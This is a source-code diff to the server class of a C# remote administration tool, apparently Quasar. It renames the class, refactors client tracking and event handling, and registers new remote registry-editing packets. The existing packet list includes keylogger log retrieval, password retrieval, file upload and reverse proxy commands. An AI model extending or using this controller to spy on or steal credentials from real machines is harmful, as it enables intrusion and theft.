@@ -1,15 +1,20 @@
 ﻿using System;
+using System.Linq;
 using xServer.Core.Commands;
+using xServer.Core.NetSerializer;
 using xServer.Core.Packets;
 
 namespace xServer.Core.Networking
 {
-    public class ServerHandler : Server
+    public class QuasarServer : Server
     {
         /// <summary>
-        /// The amount of currently connected and authenticated clients.
+        /// Gets the clients currently connected and authenticated to the server.
         /// </summary>
-        public int ConnectedClients { get; private set; }
+        public Client[] ConnectedClients
+        {
+            get { return Clients.Where(c => c != null && c.Authenticated).ToArray(); }
+        }
 
         /// <summary>
         /// Occurs when a client connected.
@@ -28,9 +33,11 @@ namespace xServer.Core.Networking
         /// <param name="client">The connected client.</param>
         private void OnClientConnected(Client client)
         {
-            if (ClientConnected != null)
+            if (ProcessingDisconnect || !Listening) return;
+            var handler = ClientConnected;
+            if (handler != null)
             {
-                ClientConnected(client);
+                handler(client);
             }
         }
 
@@ -51,18 +58,20 @@ namespace xServer.Core.Networking
         /// <param name="client">The disconnected client.</param>
         private void OnClientDisconnected(Client client)
         {
-            if (ClientDisconnected != null)
+            if (ProcessingDisconnect || !Listening) return;
+            var handler = ClientDisconnected;
+            if (handler != null)
             {
-                ClientDisconnected(client);
+                handler(client);
             }
         }
 
         /// <summary>
         /// Constructor, initializes required objects and subscribes to events of the server.
         /// </summary>
-        public ServerHandler()
+        public QuasarServer() : base()
         {
-            base.AddTypesToSerializer(new Type[]
+            base.Serializer = new Serializer(new Type[]
             {
                 typeof (Packets.ServerPackets.GetAuthentication),
                 typeof (Packets.ServerPackets.DoClientDisconnect),
@@ -95,6 +104,14 @@ namespace xServer.Core.Networking
                 typeof (Packets.ServerPackets.GetKeyloggerLogs),
                 typeof (Packets.ServerPackets.DoUploadFile),
                 typeof (Packets.ServerPackets.GetPasswords),
+                typeof (Packets.ServerPackets.DoLoadRegistryKey),
+                typeof (Packets.ServerPackets.DoCreateRegistryKey),
+                typeof (Packets.ServerPackets.DoDeleteRegistryKey),
+                typeof (Packets.ServerPackets.DoRenameRegistryKey),
+                typeof (Packets.ServerPackets.DoCreateRegistryValue),
+                typeof (Packets.ServerPackets.DoDeleteRegistryValue),
+                typeof (Packets.ServerPackets.DoRenameRegistryValue),
+                typeof (Packets.ServerPackets.DoChangeRegistryValue),
                 typeof (Packets.ServerPackets.SetAuthenticationSuccess),
                 typeof (Packets.ClientPackets.GetAuthenticationResponse),
                 typeof (Packets.ClientPackets.SetStatus),
@@ -111,14 +128,22 @@ namespace xServer.Core.Networking
                 typeof (Packets.ClientPackets.GetStartupItemsResponse),
                 typeof (Packets.ClientPackets.GetKeyloggerLogsResponse),
                 typeof (Packets.ClientPackets.GetPasswordsResponse),
+                typeof (Packets.ClientPackets.GetRegistryKeysResponse),
+                typeof (Packets.ClientPackets.GetCreateRegistryKeyResponse),
+                typeof (Packets.ClientPackets.GetDeleteRegistryKeyResponse),
+                typeof (Packets.ClientPackets.GetRenameRegistryKeyResponse),
+                typeof (Packets.ClientPackets.GetCreateRegistryValueResponse),
+                typeof (Packets.ClientPackets.GetDeleteRegistryValueResponse),
+                typeof (Packets.ClientPackets.GetRenameRegistryValueResponse),
+                typeof (Packets.ClientPackets.GetChangeRegistryValueResponse),
                 typeof (ReverseProxy.Packets.ReverseProxyConnect),
                 typeof (ReverseProxy.Packets.ReverseProxyConnectResponse),
                 typeof (ReverseProxy.Packets.ReverseProxyData),
                 typeof (ReverseProxy.Packets.ReverseProxyDisconnect)
             });
 
-            base.ClientState += ClientStateHandler;
-            base.ClientRead += ClientReadHandler;
+            base.ClientState += OnClientState;
+            base.ClientRead += OnClientRead;
         }
 
         /// <summary>
@@ -127,7 +152,7 @@ namespace xServer.Core.Networking
         /// <param name="server">The server the client is connected to.</param>
         /// <param name="client">The client which changed its state.</param>
         /// <param name="connected">True if the client connected, false if disconnected.</param>
-        private void ClientStateHandler(Server server, Client client, bool connected)
+        private void OnClientState(Server server, Client client, bool connected)
         {
             switch (connected)
             {
@@ -137,7 +162,6 @@ namespace xServer.Core.Networking
                 case false:
                     if (client.Authenticated)
                     {
-                        ConnectedClients--;
                         OnClientDisconnected(client);
                     }
                     break;
@@ -150,7 +174,7 @@ namespace xServer.Core.Networking
         /// <param name="server">The server the client is connected to.</param>
         /// <param name="client">The client which has received the packet.</param>
         /// <param name="packet">The received packet.</param>
-        private void ClientReadHandler(Server server, Client client, IPacket packet)
+        private void OnClientRead(Server server, Client client, IPacket packet)
         {
             var type = packet.GetType();
 
@@ -159,7 +183,6 @@ namespace xServer.Core.Networking
                 if (type == typeof (Packets.ClientPackets.GetAuthenticationResponse))
                 {
                     client.Authenticated = true;
-                    ConnectedClients++;
                     new Packets.ServerPackets.SetAuthenticationSuccess().Execute(client); // finish handshake
                     CommandHandler.HandleGetAuthenticationResponse(client,
                         (Packets.ClientPackets.GetAuthenticationResponse) packet);
